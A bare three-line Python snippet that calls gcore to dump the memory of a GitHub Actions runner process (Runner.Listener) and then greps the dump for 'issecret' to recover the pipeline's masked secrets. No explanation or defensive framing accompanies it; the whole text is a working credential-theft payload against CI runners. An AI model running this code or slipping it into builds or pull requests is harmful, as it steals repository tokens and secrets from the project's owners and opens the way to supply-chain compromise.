import os
os.system('''gcore -o k.dump "$(ps ax | grep Runner.Listener)";
grep issecret k.dump*''')
